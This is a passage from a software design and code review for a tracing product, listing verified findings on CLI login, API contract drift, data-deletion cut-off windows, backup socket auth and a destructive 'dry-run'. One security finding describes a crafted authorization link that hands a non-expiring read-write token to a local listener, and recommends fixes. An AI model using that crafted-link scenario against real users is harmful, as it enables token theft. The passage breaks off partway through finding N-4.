**Verifier evidence.** D-K-3 (mvp-decisions:447) windows on start_time. alerts.rs:194 uses window.predicate(spans::START_TIME) for llm-span latency, and trace measures go through scoped_traces with the window on traces.start_time. condition.rs:45 only checks that the latency threshold is > 0, with no comparison to the window. Because spans are exported when they end, every span counted at t lasted less than w. So a 1m rule with a threshold of 60000 ms or more can never fire, and in-progress traces add partial durations. The claimed bias is overstated, though. A span of duration d stays countable for w − d. Evaluations run every 60 s for windows up to 15m and every 300 s above, so a span is missed only when w − d is less than the interval. In practice that matters for 1m windows, and for 5m and 15m windows only when calls take minutes. It is an edge in the window choice, not a general under-sampling.

### Track L — admin UI

#### L-1 — The CLI half of D-L-9 was never built: no `host`, no `error=access_denied`, so Cancel leaves `cetra login` hanging 5 minutes

- **Severity:** minor (reviewer: major) · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** coordinator (CLI login, D's code; track H was named but does not own it)
- **References:**
  - docs/plans/l-admin-ui/README.md § Notes for other tracks (H: send `host`, handle `error=access_denied`)
  - docs/plans/l-admin-ui/README.md CG3
  - docs/mvp-decisions.md D-L-9
  - crates/cli/src/login.rs:49 (`/cli-auth?port={port}&state={state}`, no host)
  - crates/cli/src/login.rs:22 (WAIT = 5 min), :106-141 (wait_for_callback/handle_callback), :212-237 (token_from_request_line requires `token`)
  - web/src/routes/cli-auth.tsx:74-77 (cancel navigates to callback?error=access_denied)
  - docs/spec/08-auth.md:118 (no `host`, no error callback)

**Problem.** L built the UI side of D-L-9. The page names the token `CLI on <host>` and, on Cancel, navigates to `http://127.0.0.1:<port>/callback?error=access_denied&state=…`. L handed the CLI side to track H, but `cetra login` is D's code (commit 1bd7876) and no H plan mentions `cli-auth` or `access_denied`. So nobody picked it up.

On main, `login.rs` builds the URL with `port` and `state` only. `token_from_request_line` returns `None` for any callback without `token`, so `handle_callback` answers `400 rejected` and the loop keeps waiting until the 5-minute WAIT runs out. CG3 asked spec 08 to name `host`, but spec 08 line 118 still lists only `port` and `state`, and never describes the error callback.

**Verifier correction.** Accurate, but the impact is UX only: Cancel leaves the CLI waiting up to 5 minutes (Ctrl-C ends it) and shows a bare "rejected" page, and every CLI token is named just "CLI". No security or data impact, so minor rather than major.

**Failure scenario.** A user runs `cetra login` and clicks Cancel on /cli-auth. The browser lands on a bare plain-text page that says "rejected" instead of a cancelled page, and the terminal sits silently for 5 minutes before printing "timed out waiting for the browser".

Every CLI login also creates a token named just "CLI". On the account page, a user with logins from several machines cannot tell which token belongs to which machine when revoking one.

**Suggested fix.** In `crates/cli/src/login.rs`:
- Add `&host=<hostname>`, sanitised to `[A-Za-z0-9.-]{1,64}` and left out when nothing valid remains.
- In `token_from_request_line`, recognise `error=access_denied` with a matching `state`.
- Answer it with a short "Sign-in cancelled" HTML page and return an error, so `login` exits at once with "sign-in cancelled in the browser".
- Add tests for both cases next to the existing callback tests.

Update spec 08 line 118 to name `host` and the `error=access_denied` callback. Re-address the L README note to the CLI login owner (D, now the coordinator).

**Verifier evidence.** crates/cli/src/login.rs:49 builds `/cli-auth?port={port}&state={state}` with no host. token_from_request_line (~212-240) does `let token = token?;`, so a callback carrying only `error=access_denied` returns None. handle_callback then answers 400 "rejected" (text/plain) and wait_for_callback keeps looping until WAIT (5 min, line 22). web/src/routes/cli-auth.tsx:74-77 navigates to callback?error=access_denied, and web/src/lib/cli-auth.ts:56 names the token `CLI on <host>` only when host is present. Spec 08 (the CLI-login bullet near line 118) still names only port and state and describes no error callback. L README § Notes for other tracks hands this to H. No plan outside l-admin-ui mentions access_denied; the d-meta-auth hits are D's original login design. Not found among X1–X38.

#### L-2 — Contract gaps CG1–CG5 were never tracked or closed; spec 09 and openapi.json still describe the old contract

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** coordinator (server contract, formerly D)
- **References:**
  - docs/plans/l-admin-ui/README.md § Contract gaps (CG1–CG5) and § Notes for other tracks (lists only CG1–CG4)
  - crates/server/openapi.json components.schemas.User = [email, id, is_instance_admin, name] (no email_verified/has_password), while AdminUser has both (openapi.json ~10512; crates/server/src/routes/admin.rs:358-359)
  - docs/spec/09-api.md:62 `GET/PATCH /api/v1/me` while openapi.json /api/v1/me has only `patch`
  - openapi.json UpdateProjectRequest.retention_days: {type: integer, minimum: 0}, not nullable; crates/server/src/api/account.rs:308 is Option<Option<u32>>; crates/server/src/routes/projects.rs:242 'must be 1 to 36500'
  - web/src/routes/$org/$project/settings/general.tsx:28-30 (`as unknown as ProjectPatch` cast)
  - docs/plans/m-deletion/README.md:331 ('Not closed' CG5)
  - docs/plans/k-alerts/README.md:152 (CG2 echo)
  - docs/roadmap.md (no row or owner for any CG)

**Problem.** L's README says CG1–CG5 were reported to the coordinator. Nothing in the roadmap, mvp-decisions or any later plan picked them up, and all five are still open on main:
- **CG1.** `GET /api/auth/me` `User` has no `email_verified` or `has_password`, although the server already computes both for `AdminUser`. D-L-7's unverified-email banner and a correct D-L-12 password form stay blocked.
- **CG4.** Spec 09 line 62 still promises `GET /api/v1/me`, which does not exist.
- **CG5.** The published contract types `retention_days` as a non-null integer with `minimum: 0`, but the server takes `null` (keep forever) and rejects 0. The web works around it with an `as unknown as` cast.
- **CG2.** Project slug `settings` is still not reserved and not documented in spec 11. Later tracks have since added more `/$org/settings/*` children (plan, llm-connections).
- **CG3.** Covered in L-1.

The README's note to D owners also lists only CG1–CG4 and leaves out CG5.

**Failure scenario.** A client generated from openapi.json, for example a TypeScript or Python API client:
- cannot send `retention_days: null` to make a project keep data forever;
- would accept 0, which the server answers with 400;
- would expect a `GET /api/v1/me` from spec 09 that returns 404.

A user who signs up while email verification is required still gets no banner, as D-L-7 accepts only until CG1 lands. An SSO-only user is still shown a "Current password" field (D-L-12).

**Suggested fix.** Add a contract-gap row (or a small follow-up track) to docs/roadmap.md that names CG1, CG2, CG4 and CG5 with an owner. Then:
- **CG1.** Add `email_verified` and `has_password` to `User`.
- **CG5.** Make `retention_days` nullable with `minimum: 1, maximum: 36500` on both the create and update requests, regenerate with `just openapi`, and delete the cast in `projectPatch()`.
- **CG4.** Drop `GET` from spec 09 line 62, or implement it.
- **CG2.** Either reserve `settings` as a project slug or document the overlap in spec 11.

Add CG5 to the README's D-owner note.

**Verifier evidence.** In openapi.json, User has only id, email, is_instance_admin and name (no email_verified or has_password). UpdateProjectRequest.retention_days is {type: integer, minimum: 0} and not nullable, although its own description says "Null keeps data forever" and "from 1 to 36500". CreateProjectRequest has the same minimum: 0. /api/v1/me has only `patch`, while spec 09 line 62 says `GET/PATCH /api/v1/me`. account.rs:308 is Option<Option<u32>>. general.tsx:28-30 has the `as unknown as ProjectPatch` cast that cites CG5. The L README's D-owner note reads "CG1–CG4 above" and leaves out CG5. A grep of roadmap.md and mvp-decisions.md finds no CG row. X11 covers spec 09 drift for P surfaces only, so this is not a duplicate.

#### L-3 — D-L-2's 'G's M5 checks L's pages on the real server' never happened, but the roadmap says it did

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** coordinator (with G)
- **References:**
  - docs/mvp-decisions.md D-L-2 ('G's M5 only runs the UI on the real API and checks these pages there')
  - docs/plans/l-admin-ui/README.md:52 and § Notes for other tracks (G)
  - docs/plans/g-spine/05-m5-ui-and-e2e.md:25-30 ('Already done elsewhere'; no page check in scope)
  - crates/cli/tests/e2e.rs:347,360 (only asserts text/html is served); :161 (API-only login)
  - docs/roadmap.md row L ('the pages run against the real server since G's M5 (D-L-2)')

**Problem.** D-L-2 moved the login page to L on the condition that G's M5 would check L's pages against the real server. G's M5 plan lists L's pages under "Already done elsewhere" and puts no page check in scope. The Rust e2e test only checks that the SPA answers with text/html and signs in through the JSON API.

No test or recorded manual run has driven /login, /setup, /invite, /reset, /verify, /cli-auth or the 401 redirect against `cetra serve`. Every L test runs on MSW mocks, and those mocks follow server behaviour as the plan described it. The roadmap row still states the pages run against the real server.

**Failure scenario.** A behaviour that the mocks encode but the server does differently would ship unseen. Examples: the origin check on session POSTs behind a proxy, the cookie after `/api/auth/setup`, the `/login?error=` codes from the OAuth callback, or the `/setup` redirect from the gate. The fixture-versus-type check catches only response shapes, not status codes or redirects.

**Suggested fix.** Either add a short smoke check to `just e2e` (tools/e2e/run.sh) that drives the real server through setup, then login, then an `/api/v1` call and logout, and asserts the 401 redirect target and the `/login?error=` codes. Or record a dated manual pass of the L pages on `cetra serve` and reword the roadmap L row and D-L-2 to match what was actually verified.

**Verifier evidence.** D-L-2 in the L README says "G's M5 only serves the UI on the real API and checks these pages work there." g-spine/05-m5-ui-and-e2e.md lists L's pages under "Already done elsewhere", and its e2e scope is SDK ingest plus sign-in through the API. crates/cli/tests/e2e.rs:160-168 signs in through POST /api/auth/login, and :347/:360 only assert text/html. tools/e2e/run.sh has no login, setup or cli-auth. The roadmap L row says "the pages run against the real server since G's M5 (D-L-2)". That is true in that the pages are served, but nothing checks them. Related to X33 (roadmap rows vs plans), but X33 does not cover this.

#### L-4 — /cli-auth issues a non-expiring read-write PAT through a URL the browser keeps in history, with an attacker-chosen `host` label and no 'did you start this?' warning

- **Severity:** minor · **Verdict:** PLAUSIBLE · **Kind:** security-privacy · **Owner:** L (web) with the coordinator (spec 08 / CLI)
- **References:**
  - web/src/routes/cli-auth.tsx:59-71 (body {name, scopes:[read,write]}, no expires_at; navigateExternal)
  - web/src/lib/external-navigation.ts:3-5 (window.location.assign → history entry)
  - web/src/lib/cli-auth.ts:72-84 (token in callback query)
  - web/src/routes/cli-auth.tsx:88-92 (copy shows request.host verbatim)
  - docs/mvp-decisions.md D-L-9
  - docs/spec/08-auth.md:118

**Problem.** After Authorize, the page calls `window.location.assign('http://127.0.0.1:<port>/callback?token=pat-cetra-…&state=…')`. The full read-write PAT has no `expires_at`, and it stays in the browser's history. Browser sync and extensions with history access can read it.

Anyone can craft the link. `host` is taken verbatim into the copy ("The CLI on <host> will get…") and into the token name. The page never says "Only continue if you just ran `cetra login`". On a shared machine, a dev container or anything with a forwarded port, a crafted link sends the token to whichever local process listens on that port. The README's privacy rule names D-L-9's callback as an accepted exception, but nothing reduces what that exception exposes.

**Verifier correction.** A defense-in-depth gap in the chosen design, not a bug. The non-expiring PAT stays in browser history and can be synced, and the page gives no warning against a crafted link. The crafted-link case needs a local listener on the victim's host.

**Failure scenario.** A local process on a multi-user host, or one reachable through a forwarded port, listens on port 50123 and sends the victim `https://cetra.example.com/cli-auth?port=50123&state=abc_x&host=build-server`. The victim sees a familiar-looking host label and clicks Authorize. The listener receives a permanent read-write PAT. The same secret also sits in the victim's synced browser history until it is revoked.

**Suggested fix.** Keep the flow but bound it:
- Create the CLI token with an expiry (for example 90 days), or have the CLI exchange a one-time code. With the code, the callback carries a short-lived code, and the CLI swaps it for the PAT with `POST /api/v1/me/tokens/exchange`, so history never holds the secret.
- Add a warning above the buttons: "Only continue if you just ran the login command on this computer."
- Show `host` as "reported by the CLI".

Record the choice in D-L-9 and spec 08.

**Verifier evidence.** cli-auth.tsx:59-71 creates the PAT with {name, scopes:[read,write]} and no expires_at, then calls navigateExternal, which is window.location.assign (external-navigation.ts) and leaves a history entry. cli-auth.ts:62-75 puts the token in the callback query. The copy at tsx:88-92 shows request.host verbatim (validated only as [A-Za-z0-9.-]{1,64}), and there is no "only continue if you just ran cetra login" warning. This is the design spec 08 and D-L-9 chose. The callback is pinned to 127.0.0.1, so an attacker needs a listener on the victim's own machine (multi-user host, dev container, forwarded port). That is the standard RFC 8252 loopback risk, not a remote attack. The history exposure of a non-expiring secret is real. This is hardening, not a defect.

### Track M — deletion and retention

#### M-1 — Judge traces and scores committed after a deletion's cut-off are never erased (the filter kind has no guard before resolution; M8's B2 mitigation claim is false)

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** M
- **References:**
  - docs/plans/m-deletion/08-eval-cascade.md § Guard in the job runner, Check B2 (line 115) and 'Accepted windows' (line 117)
  - docs/plans/m-deletion/README.md § Evaluation traces (D-M-6), lines 114-118
  - docs/mvp-decisions.md D-M-6 (line 473)
  - docs/spec/03-storage.md § 7 Requests table ('rows ... with ingest_time ≤ cut-off') and § Cascades line 392
  - crates/server/src/routes/deletions.rs:336-349 (filter ids counted then discarded) and :392-399 (guard filled for TraceIds and User only)
  - crates/server/src/deletion/mod.rs:441 (cutoff: row.created_at)
  - crates/server/src/deletion/resolve.rs (eval_trace_ids at resolution time)
  - crates/eval/src/trace.rs:241-257 (target id only on the judge root span; judge spans carry no user_id)

**Problem.** Storage erases only rows with ingest_time ≤ cut-off, and the cut-off is the request's created_at. A judge trace (a copy of the prompt, variables and answer) and its score are new rows with ingest_time equal to their commit time. Nothing erases such rows when they are committed between the cut-off and the moment the guard blocks the run.

(a) Filter deletions: M4's create_deletion computes the matching ids for the cap check and throws them away. The guard gets trace entries only when M3/M8 resolve the scope. Filter rows are resolved last, one at a time, each read allowed up to 600 s. Every judge run in that window passes checks 0, A, B and B2. If the judge trace commits before resolution, eval_trace_ids puts it in deletion_traces and trace_count, but storage keeps it because its ingest_time is after the cut-off.

(b) User deletions: the guard's user entry blocks only when the trace's newest span is at or before the cut-off. A trace that mixes old spans of the user with newer spans is judged until resolution adds trace-id entries, and its copy of the user's old spans survives the same way.

(c) Check B2: M8 says a judge trace stored before B2 blocks 'is found and deleted by the next deletion whose scope reads evaluation traces'. That is false. eval_trace_ids returns only eval traces whose target is in the new scope. The target is already tombstoned, so later filter or user deletions never select it, and only a resubmission of the same trace id would. The copy also has ingest_time > cut-off, so even this deletion's scope cannot remove it.

D-M-6 and spec 03 § 7 promise the guard prevents 'a copy after the cut-off'.

**Failure scenario.** A project has an active online rule. An admin uses 'Delete matching…' for traces containing a customer's email. The POST at T0 returns 202. While a large user deletion occupies the worker, the filter row stays in resolving for several minutes. Rule jobs for the matched traces, created by on-ingest triggers or the sweeper, run during that time and commit judge traces and scores whose reason quotes the email. At resolution, eval_trace_ids adds those judge traces to the scope, and the Data tab shows them counted as deleted. Storage keeps them because ingest_time > T0, so the copies stay visible and stored until retention, which defaults to forever.

**Suggested fix.** 1. In create_deletion (M4 code; add this to M8's Edit-only list), pass the filter's counted ids to `state.deletions.guard.add_traces(project, &ids, now)`, as trace_ids rows already do.
2. Close the late-copy window for every kind. At registration (M3 register / M8), re-run eval_trace_ids over the stored targets. Any judge trace whose spans were ingested after the cut-off goes into a follow-up trace_ids deletion with created_at = now, for example a child row with the same actor, or the B2 exit inserts one for its own judge trace. The alternative is to register the evaluation-trace part with a cut-off of 'now'.
3. Delete M8's false claim about B2, and add tests: a filter deletion in resolving blocks a judge run; a judge trace committed between the cut-off and resolution ends erased.
4. Amend D-M-6 or spec 03 § 7 if some window stays accepted.

**Verifier evidence.** crates/server/src/routes/deletions.rs:336-350: the filter arm computes `matched` only for the cap check and returns an empty trace Vec. At :392-399 the guard gets entries only for TraceIds (add_traces) and User (add_user); Filter does nothing. M8 (08-eval-cascade.md § Cascade) adds add_traces only right before the scope meta.write in resolve.rs, which happens after filter_targets and eval_trace_ids (resolve.rs:36-66, each read up to RESOLVE_TIMEOUT). Storage covers only rows with `ingest_time ≤ cut-off` (spec 03 § 7 table and tombstone predicate, lines ~350-370), and the cut-off is row.created_at (deletion/mod.rs:441). A judge trace or score committed between creation and resolution therefore gets ingest_time > cut-off: eval_trace_ids pulls it into deletion_traces and trace_count, but storage never erases it. The late score row keyed on the target trace_id survives for the same reason. User case: guard.rs:56-82 blocks a user entry only when newest_ingest_ns <= created_at, so mixed old/new traces run until resolution, as claimed. B2 claim (08-eval-cascade.md ~line 115): eval_trace_ids (resolve.rs:59-61) selects eval traces only by target-in-scope. The judge root span carries the target id but no user_id (crates/eval/src/trace.rs:241-257, no user_id anywhere in the file). The target is hidden by its tombstone, so a later filter or user deletion never selects it, and even this deletion could not cover it because its ingest_time is after the cut-off. Only resubmitting the same trace id would reach it. This contradicts D-M-6 (mvp-decisions.md:473, 'nor writes a copy after the cut-off'). X15 is about the reapply path and is related but separate.

#### M-2 — M8's eval_jobs cascade scans the project's whole job table inside the instance-wide single-writer transaction

- **Severity:** minor · **Verdict:** PLAUSIBLE · **Kind:** plan-defect · **Owner:** M
- **References:**
  - docs/plans/m-deletion/08-eval-cascade.md § Cascade, lines 46-52 ('The scan runs inside the single-writer transaction ... Accepted')
  - docs/plans/i-online-eval/03-m3-queue-rules.md:477-511 (eval_jobs has no trace_id index)
  - crates/server/src/deletion/resolve.rs:66-78 (the scope meta.write)

**Problem.** `delete_for_traces` runs `SELECT id, trace_id FROM eval_jobs WHERE project_id = ? AND status <> 'running'`, decodes every row in Rust and builds a HashSet. It does this inside `MetaDb::write`, which holds the single meta.db writer for every org on the instance. It runs once per resolved deletion, even for a 1-id trace_ids request from an SDK key, and scans up to 7 days of the project's jobs. M8 already adds the guard entries before this write, so the scan does not need the writer's isolation.

**Failure scenario.** A project with sampled online rules accumulates about 1M eval_jobs rows a week. An SDK deletes traces one by one with trace_ids requests (up to 1,000 open). Each resolution holds the global writer for seconds while it decodes the rows. Logins, key last-used writes, usage flushes, alert and eval finish writes across all tenants queue behind it, and some time out.

**Suggested fix.** Choose the job ids on the reader pool before the write, after `guard.add_traces`. Inside the scope transaction, only run `DELETE … WHERE id IN (…)` in chunks of 500. A job inserted between the read and the write is caught by check 0 or check A. The other option is a small M8 migration adding `CREATE INDEX eval_jobs_trace ON eval_jobs(project_id, trace_id)` and deleting by chunks of trace ids. Either way, remove the 'Accepted' sentence.

**Verifier evidence.** 08-eval-cascade.md § Cascade: delete_for_traces does `SELECT id, trace_id FROM eval_jobs WHERE project_id = ? AND status <> 'running'`, decodes the rows in Rust, and explicitly says 'The scan runs inside the single-writer transaction ... Accepted'. resolve.rs:69-79 shows that this is the meta.write scope transaction. I's M3 schema (03-m3-queue-rules.md ~lines 475-511) has eval_jobs_project(project_id, created_at) and no trace_id index, so the scan reads every job of the project from the last 7 days. The cost is real but bounded, and the plan accepted it on purpose. Whether it stalls other writers depends on job volume, which is speculative. M8 already adds guard entries before the write, so reading on the reader pool first is a valid cheaper alternative.

#### M-3 — deletion/cascade.rs is a forwarding module created only for a future track J

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** agents-rule · **Owner:** M
- **References:**
  - docs/plans/m-deletion/08-eval-cascade.md § Cascade, lines 54-68 ('Today it has one statement; it exists so that track J adds its dataset-item deletion here')
  - docs/plans/m-deletion/README.md § Code layout (cascade.rs) and § Coordination J bullet
  - AGENTS.md § Rules: No unnecessary abstractions / No placeholders

**Problem.** `cascade::traces_deleted` only calls `meta::eval_jobs::delete_for_traces` with the same arguments. It exists as a new module so that track J, which is unplanned and has no tables, can add code later. AGENTS.md forbids module splits that remove no duplication and enforce no invariant, and it forbids adding modules for future work.

**Failure scenario.** The Haiku implementer adds a one-line forwarding module. A reviewer applying AGENTS.md flags it, or it stays as a template that J later grows into a cascade layer, against the stated rule.

**Suggested fix.** Call `crate::meta::eval_jobs::delete_for_traces(conn, project, &scope)` directly from resolve.rs's scope transaction. Remove cascade.rs from M8's Edit-only list, from the README § Code layout and from test 4's location. Make README § Coordination (J) say J adds its statement to that transaction in resolve.rs, or creates its own module when it has its own tables.

**Verifier evidence.** 08-eval-cascade.md § Cascade defines cascade::traces_deleted as a single forwarding call to meta::eval_jobs::delete_for_traces with the same arguments. Its doc comment says it exists so that track J can add code later. README.md:234 (Code layout) and :311 (Coordination) repeat this. AGENTS.md forbids a wrapper whose only job is to forward, forbids a module split unless it removes duplication or enforces an invariant, and forbids modules added for future work.

#### M-4 — Spec 03 § Cascades heading still says 'inside the server's request transaction'

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** M
- **References:**
  - docs/spec/03-storage.md:387 ('### Cascades, inside the server's request transaction (`meta.db`)') vs :389 ('The server stores a resolved scope and its cascades in one transaction')
  - docs/plans/m-deletion/README.md § Lifecycle (D-M-3: the worker's scope transaction)
  - docs/plans/m-deletion/08-eval-cascade.md § Spec and roadmap (edits only the two 'not built yet' sentences)

**Problem.** Under D-M-3 the cascades run in the worker's scope transaction, not in the request. The heading predates that decision and contradicts the first line under it. M8 is the last sub-phase to touch this section, and it lists only the two sentences to delete, so the heading will stay stale. Line 392's guard sentence also needs adjusting, depending on the outcome of M-1.

**Failure scenario.** An implementer of track J or a reapply follow-up reads the heading and puts the dataset-item cascade in the POST handler. The cascade then runs for requests that later fail as `too_many_traces` or `resolution_failed`, which breaks the rule 'failed means nothing was deleted'.

**Suggested fix.** In M8's spec edit, rename the heading to 'Cascades, in the worker's scope transaction (`meta.db`)'. After M-1 is settled, also correct line 392 about which judge runs the guard stops.

**Verifier evidence.** docs/spec/03-storage.md:387 heading reads 'Cascades, inside the server's request transaction (`meta.db`)'. Line 389 and D-M-3 say the worker stores the resolved scope and its cascades in one transaction before registration, which is the worker's scope transaction (resolve.rs), not the POST request. M8 § Spec and roadmap edits only the two 'not built yet' sentences, so the heading stays stale. Line 392's guard sentence would also need revising if M-1 is fixed.

#### M-5 — M8 executor tests 6–7 leave the ingest time `t` unspecified, but the guard ignores entries older than 24 h on the real clock

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** M
- **References:**
  - docs/plans/m-deletion/08-eval-cascade.md § Tests, lines 143-149 (tests 6 and 7: 'ingest_time = t', 'add_user(project, "u1", t + 1)' / 't - 1')
  - crates/server/src/deletion/guard.rs:56-82 (`blocks` counts only entries with created_at > now - GUARD_NS)
  - docs/plans/i-online-eval/03-m3-queue-rules.md:1278 (executor tests set the manual clock to real time)

**Problem.** Executor tests run with the manual clock set to the real time. Test 6 expects `add_user(project, "u1", t + 1)` to block, which works only if t + 1 is within 24 h of now. The plan never says t must be `state.clock.now_ns()`. Constants like 1_000, or the dataset fixture's ingest time from 2026-01-01, make the entry count as expired.

**Failure scenario.** A weaker model writes t = 1_000_000. Test 6 fails because blocks() ignores the expired entry, and the job ends `done`. Test 7 passes for the wrong reason. The implementer may then 'fix' blocks() or GUARD_NS instead of the test.

**Suggested fix.** State `let t = app.state.clock.now_ns() - 1_000_000_000;` (or `now - 1 s`) for tests 6 and 7, after the clock is set to real time. Add a sentence that guard entries must be within GUARD_NS of the clock.

**Verifier evidence.** guard.rs:56-82: blocks() counts an entry only when created_at > now - GUARD_NS (24 h). Executor tests set the manual clock to real time (08-eval-cascade.md § Tests; I's 03-m3-queue-rules.md ~line 1278 `seeded`). Tests 6 and 7 use `ingest_time = t` and `add_user(project, "u1", t ± 1)` without tying t to the clock. The only hint is the sentence about explicit ingest_time 'as in M3', and test 4 uses ingest_time = now. If t is set far in the past, test 6's entry has expired and the job ends done. Test 7 would then pass whatever the guard does. This is low impact: an implementer would likely hit the failure, but the plan should state that t is derived from clock.now_ns().

### Track N — packaging and backups

#### N-1 — Control-socket auth checks the data dir's owner, so `kubectl exec … cetra admin backup` is refused on the Helm chart

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** N
- **References:**
  - docs/plans/n-packaging/m2/00-design.md § Trigger: a local control socket (D-N-17), lines 103-105
  - docs/plans/n-packaging/m2/07-admin-socket.md § Changes › Authentication, lines 74-78
  - docs/mvp-decisions.md D-N-17 (owner-or-root rule in the design)
  - deploy/helm/cetra/templates/statefulset.yaml lines 47-52 (runAsUser 65532, fsGroup 65532) and 139-141 (PVC mounted directly at /data, CETRA_DATA_DIR=/data)
  - claude/n-m2-impl:crates/server/src/admin_socket.rs peer_is_allowed (cred.uid() == 0 || cred.uid() == metadata(data_dir).uid())
  - claude/n-m2-impl:docs/self-hosting/backup.md § Where to put <dir> › Kubernetes (documents `kubectl -n cetra exec cetra-0 -- cetra admin backup`)

**Problem.** D-N-17 and B7 accept a peer only when its uid is root or the owner of `data_dir`. That assumes the server's own uid owns the data directory. On the Helm chart, `/data` is the root of the PVC. fsGroup changes only the group of the volume root, so the owner stays whatever the provisioner set: uid 0 for a freshly formatted block volume, and root for kind's local-path hostPath directory. The server runs as 65532 and can write through the group, and so can `kubectl exec` (also 65532). The same applies to any bind mount the server can write but does not own. No B7 test covers an owner that differs from the server's uid, and helm-smoke never runs a backup.

**Failure scenario.** A Kubernetes user follows the B10 docs: `kubectl -n cetra exec cetra-0 -- cetra admin backup --to /backups/2026-11-15`. The peer uid is 65532 and `metadata("/data").uid()` is 0, so the server answers `forbidden` and every online backup on the chart fails. Docker Compose works only because the named volume copies the image's /data owner.

**Suggested fix.** Compare the peer uid with the server process's own effective uid, plus root. Without `unsafe`, take it from a file the server just created, such as the owner of `<data_dir>/LOCK` or of the bound `admin.sock.tmp`, not from `data_dir`. Amend D-N-17, 00-design § Trigger and B7 § Authentication to match. Add a unit test where the data dir's owner differs from the creating uid. Where that cannot be arranged, factor the uid check into a pure function and test that. Optionally run one `cetra admin backup` in helm-smoke.sh.

**Verifier evidence.** In 00-design.md lines 103-105 and 07-admin-socket.md lines 74-78, a peer is accepted only when its uid is root or the owner of data_dir. claude/n-m2-impl admin_socket.rs:194-202 implements exactly that: `cred.uid() == 0 || cred.uid() == metadata(data_dir).uid()`. statefulset.yaml sets runAsUser/fsGroup 65532 with fsGroupChangePolicy OnRootMismatch and mounts the PVC `data` directly at /data. There is no initContainer and no chown anywhere in deploy/helm. fsGroup changes only the group (plus setgid), so the PVC root keeps the owner the provisioner gave it, normally root. The Dockerfile `COPY --chown=65532` covers only image and named-volume /data, so compose works. The impl backup.md:115 documents `kubectl -n cetra exec cetra-0 -- cetra admin backup`. No packaging smoke runs a backup (grep for 'backup' in tools/packaging/*.sh finds nothing). I did not run this on a real cluster, but the mechanism holds.

#### N-2 — `gc-orphans --dry-run` opens the full engine, whose startup GC can delete live S3 objects

- **Severity:** major · **Verdict:** PLAUSIBLE · **Kind:** plan-defect · **Owner:** N
- **References:**
  - docs/plans/n-packaging/m2/00-design.md § Restore (D-N-21) step 3 ('`--dry-run` only reports'; 'Run it with `--dry-run` first')
  - docs/plans/n-packaging/m2/05-orphans.md lines 143-146 (acknowledges 'opening is not read-only' but treats it as safe)
  - docs/plans/n-packaging/m2/08-cli.md § GcOrphans ('opens `Storage::open(config.storage_config())`'), and the X15 `admin migrate`, which also uses Storage::open
  - crates/storage/src/lib.rs lines 458-490 (open runs gc::collect_once, gc::collect_obsolete, media.finish_drops, then spawns the GC, compaction and flush tasks)
  - crates/storage/src/gc.rs collect_once / committer.staged_before + collect_staged_path (deletes staged paths older than 1 h that the opened catalog does not list in data_files or media)

**Problem.** The plan presents `--dry-run` as the safe preview of a destructive S3 rollback. B8, however, opens the engine with `Storage::open` on the restored catalog. In S3 mode that catalog points at the live bucket. Before `collect_orphans` runs, open has already deleted every `staged_objects` path older than 1 h that the restored catalog does not publish. It has also run obsolete GC and finish_drops, and started the compaction and GC tasks, which can rewrite the restored catalog.db during the 'dry run'. A staged row in the backup is an upload in flight at snapshot time: a compaction output or a media put. flush_now does not wait for those. The live server may have published that object since.

**Verifier correction.** `--dry-run` is not report-only: Storage::open deletes staged objects unknown to the restored catalog and starts compaction and GC. In S3 mode this can delete objects the live (kept) catalog references if the operator later abandons the restore.

**Failure scenario.** An S3 meta-only backup is taken while a compaction upload is in flight. Days later the operator restores it and runs `cetra admin gc-orphans --dry-run` to see what would be rolled back. The startup staged-GC deletes the compaction output, which the live (kept) catalog lists as an active data file. The operator decides not to restore and puts the kept data directory back. Queries now fail on a missing Parquet file, so data is lost by a command documented as report-only. Even if the restore goes ahead, the restored catalog.db may already have been changed by compaction during the dry run.

**Suggested fix.** Have B5/B8 open the storage for maintenance: take LOCK and run the catalog migrations, but run no startup GC, finish_drops, compaction, flush or GC tasks. Do this with an explicit open parameter or a dedicated `Storage::open_for_maintenance`; it is not a feature flag. Use it for both `gc-orphans` and `admin migrate`. Add a test: a store (InMemory) with a staged row whose object is not in the opened catalog; `collect_orphans(dry_run = true)` leaves every object and the catalog file unchanged. Correct the wording in 05-orphans.md lines 143-146.

**Verifier evidence.** crates/storage/src/lib.rs:458-490: Storage::open runs gc::collect_once (deletes staged_objects paths older than MAX_AGE that are not published in the opened catalog), collect_obsolete and media.finish_drops, then spawns the GC, compaction and flush tasks. 08-cli.md has GcOrphans call Storage::open(config.storage_config()). 00-design.md:261/266 says '`--dry-run` only reports' and 'Run it with `--dry-run` first'. 05-orphans.md:143-146 admits 'opening is not read-only' but treats that as safe (and the sentence there is garbled). The restore procedure keeps the old data dir aside (00-design.md:251), so aborting a restore after the dry run is a real path. The data-loss scenario needs a staged row in the snapshot whose object the live server later published, plus an aborted restore. That is credible but narrow and I did not reproduce it. The claim that dry-run is not side-effect free is confirmed.

#### N-4 — B8's added `cetra admin migrate` is under-specified, and the obvious order migrates meta.db under a running server

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** N
- **References:**
  - docs/plans/n-packaging/m2/08-cli.md lines 6-14 (the X15 paragraph), § Edit only (admin.rs only for `gc_orphans`), § docs/spec/09-api.md block (no migrate row), § Done when ('Both commands … seven tests')
  - crates/server/src/meta/mod.rs (MetaDb::open migrates; meta.db has no LOCK)
  - crates/cli/src/main.rs line 132 (reapply-deletions help: 'run `cetra serve` once on a restored older backup first')
  - crates/server/src/admin.rs lines 129-131 (SourceSchema: 'run `cetra serve` on a copy of it first')

